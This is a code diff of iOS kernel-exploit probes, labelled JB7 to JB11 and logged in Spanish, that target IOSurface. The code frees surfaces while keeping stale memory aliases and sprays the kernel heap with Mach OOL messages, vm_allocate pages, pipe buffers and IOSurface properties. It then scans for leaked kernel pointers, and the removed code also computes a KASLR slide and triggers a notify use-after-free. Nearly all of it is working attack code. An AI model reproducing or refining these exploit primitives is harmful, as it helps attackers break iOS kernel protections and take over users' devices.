-        memcpy(&check, (void*)alias, 4);
-        log([NSString stringWithFormat:@"JB7: Alias=%p check=0x%08X match=%s",
-             (void*)alias, check, (check == marker) ? "SI" : "NO"]);
-
-        log(@"JB7: --- Paso 2: CFRelease superficie ---");
-        CFRelease(surf); surf = NULL;
-
+        log(@"JB10: --- Paso 1: Crear superficie NORMAL (sin PurpleGfxMem) ---");
         if (!isr_stopped()) {
-            log(@"JB7: --- Paso 3: Spray 256 mensajes Mach OOL (16KB cada uno) ---");
-            mach_port_t *oolPorts = (mach_port_t *)calloc(256, sizeof(mach_port_t));
-            int oolSent = 0;
+            NSDictionary *props = @{
+                @"IOSurfaceWidth": @64,
+                @"IOSurfaceHeight": @64,
+                @"IOSurfaceBytesPerElement": @4,
+                @"IOSurfacePixelFormat": @(0x42475241),
+            };
+            IOSurfaceRef surf = createSurf((__bridge CFDictionaryRef)props);
+            if (!surf) {
+                log(@"JB10: IOSurfaceCreate falló");
+                dlclose(h);
+                done(@{@"error": @"create_fail"});
+                return;
+            }
 
-            for (int i = 0; i < 256 && !isr_stopped(); i++) {
-                mach_port_t port = MACH_PORT_NULL;
-                mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port);
-                mach_port_insert_right(mach_task_self(), port, port, MACH_MSG_TYPE_MAKE_SEND);
+            uint32_t surfID = getID ? getID(surf) : 0;
+            size_t allocSz = getAllocSz ? getAllocSz(surf) : 0;
+            log([NSString stringWithFormat:@"JB10: Superficie normal ID=%u AllocSize=%zu", surfID, allocSz]);
 
-                struct {
-                    mach_msg_header_t hdr;
-                    mach_msg_body_t body;
-                    mach_msg_ool_descriptor_t ool;
-                } msg;
-                memset(&msg, 0, sizeof(msg));
+            uint32_t seed = 0;
+            if (lockS) lockS(surf, 3, &seed);
+            void *base = getBase(surf);
+            log([NSString stringWithFormat:@"JB10: Base=%p", base]);
 
-                uint8_t *oolData = (uint8_t *)calloc(1, 16384);
-                if (oolData) {
-                    uint32_t oolMark = 0xCC770000 | (uint32_t)i;
-                    memcpy(oolData, &oolMark, 4);
-                    for (int j = 8; j < 16384; j += 8) {
-                        uint64_t pat = 0xAAAAAAAA00000000ULL | (uint64_t)((i << 16) | j);
-                        memcpy(oolData + j, &pat, 8);
-                    }
+            if (!base || allocSz == 0) {
+                if (unlockS) { uint32_t s2 = 0; unlockS(surf, 3, &s2); }
+                CFRelease(surf);
+                dlclose(h);
+                done(@{@"error": @"no_base"});
+                return;
+            }
 
-                    msg.hdr.msgh_bits = MACH_MSGH_BITS_SET(MACH_MSG_TYPE_MAKE_SEND, 0, 0, MACH_MSGH_BITS_COMPLEX);
+            uint32_t marker = 0xAA10AA10;
+            memset(base, 0xBB, allocSz < 16384 ? allocSz : 16384);
+            memcpy(base, &marker, sizeof(marker));
+
+            log(@"JB10: --- Paso 2: mach_make_memory_entry_64 ---");
+            entrySize = (memory_object_size_t)allocSz;
+            kern_return_t mkr = makeEntry(mach_task_self(), &entrySize,
+                (memory_object_offset_t)(uintptr_t)base,
+                VM_PROT_READ | VM_PROT_WRITE, &entryPort, MACH_PORT_NULL);
+            log([NSString stringWithFormat:@"JB10: memory_entry kr=%d port=%u size=%llu", mkr, entryPort, (uint64_t)entrySize]);
+
+            if (mkr != KERN_SUCCESS || entryPort == MACH_PORT_NULL) {
+                if (unlockS) { uint32_t s2 = 0; unlockS(surf, 3, &s2); }
+                CFRelease(surf);
+                dlclose(h);
+                done(@{@"error": @"memory_entry_fail"});
+                return;
+            }
+
+            log(@"JB10: --- Paso 3: vm_map alias ---");
+            kern_return_t vmkr = vm_map(mach_task_self(), &alias, (vm_size_t)entrySize,
+                0, VM_FLAGS_ANYWHERE, entryPort, 0, FALSE,
+                VM_PROT_READ | VM_PROT_WRITE, VM_PROT_READ | VM_PROT_WRITE,
+                VM_INHERIT_NONE);
+            log([NSString stringWithFormat:@"JB10: vm_map kr=%d alias=%p", vmkr, (void*)alias]);
+
+            if (vmkr != KERN_SUCCESS) {
+                if (unlockS) { uint32_t s2 = 0; unlockS(surf, 3, &s2); }
+                mach_port_deallocate(mach_task_self(), entryPort);
+                CFRelease(surf);
+                dlclose(h);
+                done(@{@"error": @"vm_map_fail"});
+                return;
+            }
+
+            uint32_t aliasRead = 0;
+            memcpy(&aliasRead, (void*)alias, 4);
+            log([NSString stringWithFormat:@"JB10: Alias lee marcador: 0x%08X (esperado 0xAA10AA10)", aliasRead]);
+
+            if (unlockS) { uint32_t s2 = 0; unlockS(surf, 3, &s2); }
+
+            log(@"JB10: --- Paso 4: CFRelease superficie — alias queda vivo ---");
+            CFRelease(surf);
+            surf = NULL;
+
+            usleep(50000);
+            uint32_t afterFree = 0;
+            memcpy(&afterFree, (void*)alias, 4);
+            log([NSString stringWithFormat:@"JB10: Post-free alias lee: 0x%08X", afterFree]);
+        }
+
+        log(@"JB10: --- Paso 5: Spray OOL messages ---");
+        if (!isr_stopped() && alias) {
+            mach_port_t oolPort = MACH_PORT_NULL;
+            mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &oolPort);
+            mach_port_insert_right(mach_task_self(), oolPort, oolPort, MACH_MSG_TYPE_MAKE_SEND);
+
+            uint8_t *oolBuf = (uint8_t *)calloc(1, 16384);
+            if (oolBuf) {
+                for (int i = 0; i < 256 && !isr_stopped(); i++) {
+                    uint32_t oolMark = 0xCC100000 | (uint32_t)i;
+                    for (int j = 0; j < 16384/4; j++)
+                        ((uint32_t*)oolBuf)[j] = oolMark;
+
+                    struct {
+                        mach_msg_header_t hdr;
+                        mach_msg_body_t body;
+                        mach_msg_ool_descriptor_t ool;
+                    } msg;
+                    memset(&msg, 0, sizeof(msg));
+                    msg.hdr.msgh_bits = MACH_MSGH_BITS_COMPLEX | MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0);
                     msg.hdr.msgh_size = sizeof(msg);
-                    msg.hdr.msgh_remote_port = port;
+                    msg.hdr.msgh_remote_port = oolPort;
                     msg.hdr.msgh_local_port = MACH_PORT_NULL;
                     msg.body.msgh_descriptor_count = 1;
-                    msg.ool.address = oolData;
+                    msg.ool.address = oolBuf;
                     msg.ool.size = 16384;
                     msg.ool.deallocate = FALSE;
                     msg.ool.copy = MACH_MSG_VIRTUAL_COPY;
                     msg.ool.type = MACH_MSG_OOL_DESCRIPTOR;
-
-                    kern_return_t kr = mach_msg(&msg.hdr, MACH_SEND_MSG, sizeof(msg), 0,
-                        MACH_PORT_NULL, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
-                    if (kr == KERN_SUCCESS) {
-                        oolPorts[i] = port;
-                        oolSent++;
-                    } else {
-                        mach_port_deallocate(mach_task_self(), port);
-                    }
-                    free(oolData);
+                    mach_msg(&msg.hdr, MACH_SEND_MSG | MACH_SEND_TIMEOUT, sizeof(msg), 0, MACH_PORT_NULL, 10, MACH_PORT_NULL);
                 }
+                free(oolBuf);
+                log(@"JB10: 256 OOL messages enviados (16KB cada uno)");
             }
-            log([NSString stringWithFormat:@"JB7: OOL spray: %d/256 mensajes enviados", oolSent]);
 
-            log(@"JB7: --- Paso 4: Escaneo del alias buscando datos OOL/kernel ---");
-            if (!isr_stopped()) {
-                size_t scanSz = entrySize < 16384 ? (size_t)entrySize : 16384;
-                uint32_t firstWord = 0;
-                memcpy(&firstWord, (void*)alias, 4);
-                log([NSString stringWithFormat:@"JB7: Alias[0]=0x%08X (marker=0xDEAD7777)", firstWord]);
-
-                int reclaimed = (firstWord != marker && firstWord != 0);
-                log([NSString stringWithFormat:@"JB7: Paginas reclamadas: %s", reclaimed ? "SI" : "NO"]);
-
-                for (size_t off = 0; off + 8 <= scanSz && !isr_stopped(); off += 4) {
-                    uint64_t val = 0;
-                    memcpy(&val, (void*)(alias + off), 8);
-
-                    if ((val & 0xFFFFFF0000000000ULL) == 0xFFFFFFF000000000ULL) {
+            usleep(20000);
+            uint64_t *scan = (uint64_t*)alias;
+            for (uint32_t k = 0; k < (uint32_t)(entrySize/8) && !isr_stopped(); k++) {
+                uint64_t v = scan[k];
+                if ((v & 0xFFFFFF0000000000ULL) == 0xFFFFFFF000000000ULL) {
+                    if ((v & 0xFFFFFFF000000000ULL) == 0xFFFFFFF000000000ULL && v < 0xFFFFFFF800000000ULL)
                         kernTextPtrs++;
-                        if (kernTextPtrs <= 10)
-                            log([NSString stringWithFormat:@"JB7: *** KERN TEXT @ +0x%zx: 0x%016llx ***",
-                                 off, (unsigned long long)val]);
-                        if (bestPtr == 0 || val < bestPtr) bestPtr = val;
-                    }
-                    if ((val & 0xFFFFFF0000000000ULL) == 0xFFFFFFE000000000ULL) {
+                    else
                         kernHeapPtrs++;
-                        if (kernHeapPtrs <= 10)
-                            log([NSString stringWithFormat:@"JB7: *** KERN HEAP @ +0x%zx: 0x%016llx ***",
-                                 off, (unsigned long long)val]);
-                    }
-                    if ((val & 0xFFFF000000000000ULL) == 0xCC77000000000000ULL ||
-                        (val & 0xFFFFFFFF00000000ULL) == 0xAAAAAAAA00000000ULL) {
-                        oolHits++;
-                    }
+                    if (!bestPtr) bestPtr = v;
+                    log([NSString stringWithFormat:@"JB10: *** OOL KERNEL PTR [%u]: 0x%llx ***", k, (unsigned long long)v]);
                 }
-
-                log([NSString stringWithFormat:@"JB7: kernText=%u kernHeap=%u oolHits=%u", kernTextPtrs, kernHeapPtrs, oolHits]);
-
-                if (kernTextPtrs > 0) {
-                    uint64_t slide = bestPtr - 0xfffffff007004000ULL;
-                    log([NSString stringWithFormat:@"JB7: *** POSIBLE KASLR SLIDE: 0x%llx ***", (unsigned long long)slide]);
-                }
-
-                log(@"JB7: Primeros 128 bytes del alias:");
-                for (int i = 0; i < 128 && i < (int)scanSz; i += 32) {
-                    uint64_t a = 0, b = 0, c = 0, d = 0;
-                    memcpy(&a, (void*)(alias + i), 8);
-                    memcpy(&b, (void*)(alias + i + 8), 8);
-                    memcpy(&c, (void*)(alias + i + 16), 8);
-                    memcpy(&d, (void*)(alias + i + 24), 8);
-                    log([NSString stringWithFormat:@"JB7: +%03d: %016llx %016llx %016llx %016llx",
-                         i, (unsigned long long)a, (unsigned long long)b,
-                         (unsigned long long)c, (unsigned long long)d]);
-                }
+                if ((v >> 16) == 0xCC10)
+                    oolHits++;
             }
-
-            log(@"JB7: --- Paso 5: Cleanup OOL ports ---");
-            for (int i = 0; i < 256; i++) {
-                if (oolPorts[i] != MACH_PORT_NULL)
-                    mach_port_destroy(mach_task_self(), oolPorts[i]);
-            }
-            free(oolPorts);
+            log([NSString stringWithFormat:@"JB10: OOL scan: kernText=%u kernHeap=%u oolMarks=%u", kernTextPtrs, kernHeapPtrs, oolHits]);
+            mach_port_destroy(mach_task_self(), oolPort);
         }
 
-        vm_deallocate(mach_task_self(), alias, (vm_size_t)entrySize);
-        mach_port_deallocate(mach_task_self(), entryPort);
+        log(@"JB10: --- Paso 6: Spray vm_allocate ---");
+        if (!isr_stopped() && alias) {
+            vm_address_t *vmPages = (vm_address_t *)calloc(256, sizeof(vm_address_t));
+            int vmCount = 0;
+            if (vmPages) {
+                for (int i = 0; i < 256 && !isr_stopped(); i++) {
+                    vm_address_t pg = 0;
+                    if (vm_allocate(mach_task_self(), &pg, 16384, VM_FLAGS_ANYWHERE) == KERN_SUCCESS) {
+                        uint32_t vmMark = 0xDD100000 | (uint32_t)i;
+                        for (int j = 0; j < 16384/4; j++)
+                            ((uint32_t*)pg)[j] = vmMark;
+                        vmPages[vmCount++] = pg;
+                    }
+                }
+                log([NSString stringWithFormat:@"JB10: %d vm_allocate páginas sprayed", vmCount]);
+                usleep(20000);
 
-        log(@"JB7: ========================================");
-        log([NSString stringWithFormat:@"JB7: RESULTADO: kernText=%u kernHeap=%u oolHits=%u bestPtr=0x%llx",
-             kernTextPtrs, kernHeapPtrs, oolHits, (unsigned long long)bestPtr]);
-        log(@"JB7: ========================================");
+                uint64_t *scan = (uint64_t*)alias;
+                for (uint32_t k = 0; k < (uint32_t)(entrySize/8) && !isr_stopped(); k++) {
+                    uint64_t v = scan[k];
+                    if ((v & 0xFFFFFF0000000000ULL) == 0xFFFFFFF000000000ULL) {
+                        if (v < 0xFFFFFFF800000000ULL)
+                            kernTextPtrs++;
+                        else
+                            kernHeapPtrs++;
+                        if (!bestPtr) bestPtr = v;
+                        log([NSString stringWithFormat:@"JB10: *** VM KERNEL PTR [%u]: 0x%llx ***", k, (unsigned long long)v]);
+                    }
+                    if ((v >> 16) == 0xDD10)
+                        vmHits++;
+                }
+                log([NSString stringWithFormat:@"JB10: vm scan: vmMarks=%u", vmHits]);
+
+                for (int i = 0; i < vmCount; i++)
+                    vm_deallocate(mach_task_self(), vmPages[i], 16384);
+                free(vmPages);
+            }
+        }
+
+        log(@"JB10: --- Paso 7: Spray pipe buffers ---");
+        if (!isr_stopped() && alias) {
+            pipeFds = (int(*)[2])calloc(256, sizeof(int[2]));
+            if (pipeFds) {
+                uint8_t *pipeBuf = (uint8_t *)calloc(1, 16384);
+                if (pipeBuf) {
+                    for (int i = 0; i < 256 && !isr_stopped(); i++) {
+                        if (pipe(pipeFds[i]) == 0) {
+                            uint32_t pipeMark = 0xEE100000 | (uint32_t)i;
+                            for (int j = 0; j < 16384/4; j++)
+                                ((uint32_t*)pipeBuf)[j] = pipeMark;
+                            write(pipeFds[i][1], pipeBuf, 16384);
+                            pipeCount++;
+                        }
+                    }
+                    free(pipeBuf);
+                }
+                log([NSString stringWithFormat:@"JB10: %d pipes sprayed", pipeCount]);
+                usleep(20000);
+
+                uint64_t *scan = (uint64_t*)alias;
+                for (uint32_t k = 0; k < (uint32_t)(entrySize/8) && !isr_stopped(); k++) {
+                    uint64_t v = scan[k];
+                    if ((v & 0xFFFFFF0000000000ULL) == 0xFFFFFFF000000000ULL) {
+                        if (v < 0xFFFFFFF800000000ULL)
+                            kernTextPtrs++;
+                        else
+                            kernHeapPtrs++;
+                        if (!bestPtr) bestPtr = v;
+                        log([NSString stringWithFormat:@"JB10: *** PIPE KERNEL PTR [%u]: 0x%llx ***", k, (unsigned long long)v]);
+                    }
+                    if ((v >> 16) == 0xEE10)
+                        pipeHits++;
+                }
+                log([NSString stringWithFormat:@"JB10: pipe scan: pipeMarks=%u", pipeHits]);
+
+                for (int i = 0; i < pipeCount; i++) {
+                    close(pipeFds[i][0]);
+                    close(pipeFds[i][1]);
+                }
+                free(pipeFds);
+            }
+        }
+
+        if (alias)
+            vm_deallocate(mach_task_self(), alias, (vm_size_t)entrySize);
+        if (entryPort != MACH_PORT_NULL)
+            mach_port_deallocate(mach_task_self(), entryPort);
+
+        log(@"JB10: ========================================");
+        log([NSString stringWithFormat:@"JB10: RESULTADO: kernText=%u kernHeap=%u oolHits=%u vmHits=%u pipeHits=%u bestPtr=0x%llx",
+             kernTextPtrs, kernHeapPtrs, oolHits, vmHits, pipeHits, (unsigned long long)bestPtr]);
+        log(@"JB10: ========================================");
         dlclose(h);
         done(@{
             @"kernelTextPtrs": @(kernTextPtrs), @"kernelHeapPtrs": @(kernHeapPtrs),
-            @"oolHits": @(oolHits), @"bestKernelPtr": [NSString stringWithFormat:@"0x%llx", (unsigned long long)bestPtr]
+            @"oolHits": @(oolHits), @"vmHits": @(vmHits), @"pipeHits": @(pipeHits),
+            @"bestKernelPtr": [NSString stringWithFormat:@"0x%llx", (unsigned long long)bestPtr]
         });
     });
 }
 
-#pragma mark - Probe JB8: Notify UAF + Stale Alias Combo
+#pragma mark - Probe JB11: IOSurface Property Kalloc Oracle
 
-void iosurface_notify_uaf_alias(ISRLogBlock _Nonnull log, ISRDoneBlock _Nonnull done) {
+void iosurface_property_kalloc_oracle(ISRLogBlock _Nonnull log, ISRDoneBlock _Nonnull done) {
     atomic_store(&g_isr_stop, false);
-    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_HIGH, 0), ^{
-        log(@"JB8: ========================================");
-        log(@"JB8: Notify UAF + Stale Alias Combo");
-        log(@"JB8: ========================================");
+    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
+        log(@"JB11: ========================================");
+        log(@"JB11: IOSurface Property Kalloc Oracle");
+        log(@"JB11: Spray propiedades → free → reclaim → buscar stale data");
+        log(@"JB11: ========================================");
 
-        void *h = dlopen("/System/Library/Frameworks/IOSurface.framework/IOSurface", RTLD_NOW);
+        void *h = dlopen("/System/Library/Frameworks/IOSurface.framework/IOSurface",
+                         RTLD_LAZY | RTLD_LOCAL);
         if (!h) { done(@{@"error": @"dlopen"}); return; }
 
         typedef IOSurfaceRef (*CreateFn)(CFDictionaryRef);
-        CreateFn createSurf = (CreateFn)dlsym(h, "IOSurfaceCreate");
         typedef uint32_t (*GetIDFn)(IOSurfaceRef);
-        GetIDFn getID = (GetIDFn)dlsym(h, "IOSurfaceGetID");
-        typedef void* (*GetBaseFn)(IOSurfaceRef);
-        GetBaseFn getBase = (GetBaseFn)dlsym(h, "IOSurfaceGetBaseAddress");
-        typedef size_t (*GetAllocSzFn)(IOSurfaceRef);
-        GetAllocSzFn getAllocSz = (GetAllocSzFn)dlsym(h, "IOSurfaceGetAllocSize");
-        typedef kern_return_t (*LockFn)(IOSurfaceRef, uint32_t, uint32_t *);
-        LockFn lockS = (LockFn)dlsym(h, "IOSurfaceLock");
-        typedef kern_return_t (*UnlockFn)(IOSurfaceRef, uint32_t, uint32_t *);
-        UnlockFn unlockS = (UnlockFn)dlsym(h, "IOSurfaceUnlock");
         typedef void (*SetValueFn)(IOSurfaceRef, CFStringRef, CFTypeRef);
-        SetValueFn setValue = (SetValueFn)dlsym(h, "IOSurfaceSetValue");
-        typedef CFDictionaryRef (*CopyAllFn)(IOSurfaceRef);
-        CopyAllFn copyAll = (CopyAllFn)dlsym(h, "IOSurfaceCopyAllValues");
-        typedef kern_return_t (*MakeEntryFn)(vm_map_t, memory_object_size_t *,
-            memory_object_offset_t, vm_prot_t, mach_port_t *, mem_entry_name_port_t);
-        MakeEntryFn makeEntry = (MakeEntryFn)dlsym(RTLD_DEFAULT, "mach_make_memory_entry_64");
+        typedef CFDictionaryRef (*CopyAllValuesFn)(IOSurfaceRef);
 
-        typedef kern_return_t (*SetNotifyFn)(IOSurfaceRef, void *, void *);
-        SetNotifyFn setNotify = (SetNotifyFn)dlsym(h, "IOSurfaceClientSetSurfaceNotify");
-        typedef kern_return_t (*RemoveNotifyFn)(IOSurfaceRef);
-        RemoveNotifyFn removeNotify = (RemoveNotifyFn)dlsym(h, "IOSurfaceClientRemoveSurfaceNotify");
-
-        if (!createSurf || !getBase || !makeEntry) {
-            dlclose(h); done(@{@"error": @"dlsym"}); return;
-        }
-
-        log([NSString stringWithFormat:@"JB8: SetNotify=%p RemoveNotify=%p",
-             (void*)setNotify, (void*)removeNotify]);
-
-        uint32_t kernPtrs = 0;
-        uint32_t uafHits = 0;
-        uint32_t notifyObjPtrs = 0;
-
-        log(@"JB8: --- Paso 1: Crear superficie notify + alias ---");
-        NSDictionary *surfProps = @{
-            @"IOSurfaceWidth": @64, @"IOSurfaceHeight": @64,
-            @"IOSurfaceBytesPerElement": @4, @"IOSurfacePixelFormat": @(0x42475241),
-            @"IOSurfaceMemoryRegion": @"PurpleGfxMem",
-        };
-        IOSurfaceRef notifySurf = createSurf((__bridge CFDictionaryRef)surfProps);
-        if (!notifySurf) {
-            NSDictionary *fb = @{ @"IOSurfaceWidth": @64, @"IOSurfaceHeight": @64,
-                @"IOSurfaceBytesPerElement": @4, @"IOSurfacePixelFormat": @(0x42475241) };
-            notifySurf = createSurf((__bridge CFDictionaryRef)fb);
-        }
-        if (!notifySurf) { dlclose(h); done(@{@"error": @"create"}); return; }
-
-        size_t allocSz = getAllocSz ? getAllocSz(notifySurf) : 0;
-        uint32_t notifyID = getID ? getID(notifySurf) : 0;
-        if (lockS) { uint32_t s = 0; lockS(notifySurf, 3, &s); }
-        void *base = getBase(notifySurf);
-        log([NSString stringWithFormat:@"JB8: Notify surface ID=%u base=%p alloc=%zu", notifyID, base, allocSz]);
-
-        if (!base || allocSz == 0) {
-            if (unlockS) { uint32_t s = 0; unlockS(notifySurf, 3, &s); }
-            CFRelease(notifySurf); dlclose(h); done(@{@"error": @"no_base"}); return;
-        }
-
-        uint32_t notifyMarker = 0xDEAD8888;
-        memcpy(base, &notifyMarker, 4);
-        if (unlockS) { uint32_t s = 0; unlockS(notifySurf, 3, &s); }
-
-        log(@"JB8: --- Paso 2: Registrar notificacion kernel ---");
-        kern_return_t notifyKr = -1;
-        if (setNotify) {
-            notifyKr = setNotify(notifySurf, NULL, NULL);
-            log([NSString stringWithFormat:@"JB8: SetSurfaceNotify kr=%d", notifyKr]);
-        } else {
-            log(@"JB8: SetSurfaceNotify no disponible, continuando sin notify");
-        }
-
-        log(@"JB8: --- Paso 3: Memory entry + alias ---");
-        mach_port_t entryPort = MACH_PORT_NULL;
-        memory_object_size_t entrySize = (memory_object_size_t)allocSz;
-        makeEntry(mach_task_self(), &entrySize, (memory_object_offset_t)(uintptr_t)base,
-            VM_PROT_READ | VM_PROT_WRITE, &entryPort, MACH_PORT_NULL);
-
-        vm_address_t alias = 0;
-        vm_map(mach_task_self(), &alias, (vm_size_t)entrySize, 0, VM_FLAGS_ANYWHERE,
-            entryPort, 0, FALSE, VM_PROT_READ | VM_PROT_WRITE,
-            VM_PROT_READ | VM_PROT_WRITE, VM_INHERIT_NONE);
-
-        log(@"JB8: --- Paso 4: Remover notificacion (trigger UAF en kernel) ---");
-        if (removeNotify && notifyKr == 0) {
-            kern_return_t rmkr = removeNotify(notifySurf);
-            log([NSString stringWithFormat:@"JB8: RemoveSurfaceNotify kr=%d", rmkr]);
-        }
-
-        log(@"JB8: --- Paso 5: CFRelease superficie (alias+notify freed) ---");
-        CFRelease(notifySurf); notifySurf = NULL;
-
-        if (!isr_stopped()) {
-            log(@"JB8: --- Paso 6: Spray IOSurfaces para reclamar paginas notify ---");
-            int sprayCount = 100;
-            IOSurfaceRef *sprays = (IOSurfaceRef *)calloc((size_t)sprayCount, sizeof(IOSurfaceRef));
-            int sprayed = 0;
-
-            for (int i = 0; i < sprayCount && !isr_stopped(); i++) {
-                sprays[i] = createSurf((__bridge CFDictionaryRef)surfProps);
-                if (!sprays[i]) break;
-                sprayed++;
-
-                if (lockS) { uint32_t s = 0; lockS(sprays[i], 3, &s); }
-                void *sb = getBase(sprays[i]);
-                if (sb) {
-                    uint32_t sm = 0xDD880000 | (uint32_t)i;
-                    memcpy(sb, &sm, 4);
-                    for (size_t off = 8; off + 8 <= 4096 && off + 8 <= allocSz; off += 8) {
-                        uint64_t pat = 0xBBBBBBBB00000000ULL | (uint64_t)((i << 12) | off);
-                        memcpy((uint8_t*)sb + off, &pat, 8);
-                    }
-                }
-                if (unlockS) { uint32_t s = 0; unlockS(sprays[i], 3, &s); }
-
-                if (setValue) {
-                    uint8_t *propBuf = (uint8_t *)calloc(1, 4096);
-                    if (propBuf) {
-                        uint64_t notifyPattern = 0xFFFF880000000000ULL | (uint64_t)i;
-                        for (int j = 0; j < 4096; j += 8)
-                            memcpy(propBuf + j, &notifyPattern, 8);
-                        NSData *d = [NSData dataWithBytes:propBuf length:4096];
-                        setValue(sprays[i], (__bridge CFStringRef)[NSString stringWithFormat:@"JB8_%d", i],
-                            (__bridge CFTypeRef)d);
-                        free(propBuf);
-                    }
-                }
-            }
-            log([NSString stringWithFormat:@"JB8: Spray %d/%d superficies", sprayed, sprayCount]);
-
-            log(@"JB8: --- Paso 7: Escaneo alias buscando datos kernel/notify ---");
-            if (!isr_stopped()) {
-                size_t scanSz = entrySize < 16384 ? (size_t)entrySize : 16384;
-                uint32_t firstWord = 0;
-                memcpy(&firstWord, (void*)alias, 4);
-                log([NSString stringWithFormat:@"JB8: Alias[0]=0x%08X (marker=0xDEAD8888)", firstWord]);
-                log([NSString stringWithFormat:@"JB8: Reclamado: %s", (firstWord != notifyMarker) ? "SI" : "NO"]);
-
-                for (size_t off = 0; off + 8 <= scanSz && !isr_stopped(); off += 4) {
-                    uint64_t val = 0;
-                    memcpy(&val, (void*)(alias + off), 8);
-
-                    if ((val & 0xFFFFFF0000000000ULL) == 0xFFFFFFF000000000ULL ||
-                        (val & 0xFFFFFF0000000000ULL) == 0xFFFFFFE000000000ULL) {
-                        kernPtrs++;
-                        if (kernPtrs <= 15)
-                            log([NSString stringWithFormat:@"JB8: *** KERNEL PTR @ +0x%zx: 0x%016llx ***",
-                                 off, (unsigned long long)val]);
-                    }
-
-                    if (val != 0 && val != 0xBBBBBBBB00000000ULL &&
-                        (val >> 40) != 0xDD88 && (val >> 40) != 0xFFFF88) {
-                        if ((val & 0xFFFF000000000000ULL) == 0xFFFF000000000000ULL) {
-                            notifyObjPtrs++;
-                            if (notifyObjPtrs <= 10)
-                                log([NSString stringWithFormat:@"JB8: INTERESANTE @ +0x%zx: 0x%016llx",
-                                     off, (unsigned long long)val]);
-                        }
-                    }
-                }
-
-                log([NSString stringWithFormat:@"JB8: kernPtrs=%u notifyObjPtrs=%u", kernPtrs, notifyObjPtrs]);
-
-                log(@"JB8: Primeros 128 bytes del alias:");
-                for (int i = 0; i < 128 && i < (int)scanSz; i += 32) {
-                    uint64_t a = 0, b = 0, c = 0, d = 0;
-                    memcpy(&a, (void*)(alias + i), 8);
-                    memcpy(&b, (void*)(alias + i + 8), 8);
-                    memcpy(&c, (void*)(alias + i + 16), 8);
-                    memcpy(&d, (void*)(alias + i + 24), 8);
-                    log([NSString stringWithFormat:@"JB8: +%03d: %016llx %016llx %016llx %016llx",
-                         i, (unsigned long long)a, (unsigned long long)b,
-                         (unsigned long long)c, (unsigned long long)d]);
-                }
-            }
-
-            log(@"JB8: --- Paso 8: Re-registrar notify en sprays para trigger ---");
-            if (!isr_stopped() && setNotify) {
-                for (int i = 0; i < sprayed && !isr_stopped(); i++) {
-                    if (!sprays[i]) continue;
-                    kern_return_t nkr = setNotify(sprays[i], NULL, NULL);
-                    if (nkr == 0) uafHits++;
-                }
-                log([NSString stringWithFormat:@"JB8: Notify registrado en %u/%d sprays", uafHits, sprayed]);
-            }
-
-            log(@"JB8: --- Paso 9: Escaneo post-notify del alias ---");
-            if (!isr_stopped()) {
-                uint32_t postKern = 0;
-                size_t scanSz = entrySize < 16384 ? (size_t)entrySize : 16384;
-                for (size_t off = 0; off + 8 <= scanSz; off += 4) {
-                    uint64_t val = 0;
-                    memcpy(&val, (void*)(alias + off), 8);
-                    if ((val & 0xFFFFFF0000000000ULL) == 0xFFFFFFF000000000ULL ||
-                        (val & 0xFFFFFF0000000000ULL) == 0xFFFFFFE000000000ULL) {
-                        postKern++;
-                        if (postKern <= 10)
-                            log([NSString stringWithFormat:@"JB8: *** POST-NOTIFY KERN PTR @ +0x%zx: 0x%016llx ***",
-                                 off, (unsigned long long)val]);
-                    }
-                }
-                log([NSString stringWithFormat:@"JB8: Post-notify kernel ptrs: %u", postKern]);
-                kernPtrs += postKern;
-            }
-
-            log(@"JB8: --- Paso 10: Task info ---");
-            if (!isr_stopped()) {
-                task_dyld_info_data_t di;
-                mach_msg_type_number_t dc = TASK_DYLD_INFO_COUNT;
-                if (task_info(mach_task_self(), TASK_DYLD_INFO, (task_info_t)&di, &dc) == KERN_SUCCESS)
-                    log([NSString stringWithFormat:@"JB8: DYLD info=0x%llx", di.all_image_info_addr]);
-            }
-
-            for (int i = 0; i < sprayed; i++) {
-                if (sprays[i]) CFRelease(sprays[i]);
-            }
-            free(sprays);
-        }
-
-        vm_deallocate(mach_task_self(), alias, (vm_size_t)entrySize);
-        mach_port_deallocate(mach_task_self(), entryPort);
-
-        log(@"JB8: ========================================");
-        log([NSString stringWithFormat:@"JB8: RESULTADO: kernPtrs=%u uafNotify=%u notifyObj=%u",
-             kernPtrs, uafHits, notifyObjPtrs]);
-        log(@"JB8: ========================================");
-        dlclose(h);
-        done(@{
-            @"kernelPointers": @(kernPtrs), @"uafNotifyHits": @(uafHits),
-            @"notifyObjPtrs": @(notifyObjPtrs)
-        });
-    });
-}
-
-#pragma mark - Probe JB9: Pipe Buffer Spray into Stale Alias
-
-void iosurface_pipe_spray_alias(ISRLogBlock _Nonnull log, ISRDoneBlock _Nonnull done) {
-    atomic_store(&g_isr_stop, false);
-    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_HIGH, 0), ^{
-        log(@"JB9: ========================================");
-        log(@"JB9: Pipe Buffer Spray into Stale Alias");
-        log(@"JB9: ========================================");
-
-        void *h = dlopen("/System/Library/Frameworks/IOSurface.framework/IOSurface", RTLD_NOW);
-        if (!h) { done(@{@"error": @"dlopen"}); return; }
-
-        typedef IOSurfaceRef (*CreateFn)(CFDictionaryRef);
         CreateFn createSurf = (CreateFn)dlsym(h, "IOSurfaceCreate");
-        typedef void* (*GetBaseFn)(IOSurfaceRef);
-        GetBaseFn getBase = (GetBaseFn)dlsym(h, "IOSurfaceGetBaseAddress");
-        typedef size_t (*GetAllocSzFn)(IOSurfaceRef);
-        GetAllocSzFn getAllocSz = (GetAllocSzFn)dlsym(h, "IOSurfaceGetAllocSize");
-        typedef kern_return_t (*LockFn)(IOSurfaceRef, uint32_t, uint32_t *);
-        LockFn lockS = (LockFn)dlsym(h, "IOSurfaceLock");
-        typedef kern_return_t (*UnlockFn)(IOSurfaceRef, uint32_t, uint32_t *);
-        UnlockFn unlockS = (UnlockFn)dlsym(h, "IOSurfaceUnlock");
-        typedef kern_return_t (*MakeEntryFn)(vm_map_t, memory_object_size_t *,
-            memory_object_offset_t, vm_prot_t, mach_port_t *, mem_entry_name_port_t);
-        MakeEntryFn makeEntry = (MakeEntryFn)dlsym(RTLD_DEFAULT, "mach_make_memory_entry_64");
+        GetIDFn getID = (GetIDFn)dlsym(h, "IOSurfaceGetID");
